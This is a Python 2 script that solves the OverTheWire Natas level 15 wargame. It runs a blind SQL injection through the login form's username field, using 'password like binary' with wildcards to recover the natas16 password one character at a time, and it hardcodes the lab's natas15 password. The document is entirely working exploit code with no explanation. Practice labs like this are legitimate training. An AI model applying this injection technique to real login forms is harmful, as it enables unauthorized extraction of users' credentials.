import string

import mechanize

br = mechanize.Browser()
br.set_handle_robots(False) # Not to be used everywhere.

natas15 = "http://natas15.natas.labs.overthewire.org"

br.add_password(natas15, "natas15", "7h15154h3lL0f4p455w0rD")

br.open(natas15)
form = (br.forms()).next()

chlist = string.letters + string.digits

st = ''
base_string = 'natas16" and password like binary "'

br.form = form
out_form = base_string + st + '_%'
br["username"] = out_form
response = br.submit()
out = response.read()

while('exists' in out):
    for ch in chlist:
        print st + ch
        br.form = form
        out_form = base_string + st + ch + '%'
        br["username"] = out_form
        response = br.submit()
        out = response.read()
        if 'exists' in out:
            st = st + ch
            break

    br.form = form
    out_form = base_string + st + '_%'
    br["username"] = out_form
    response = br.submit()
    out = response.read()

print "Done and done."
    
exit(0)
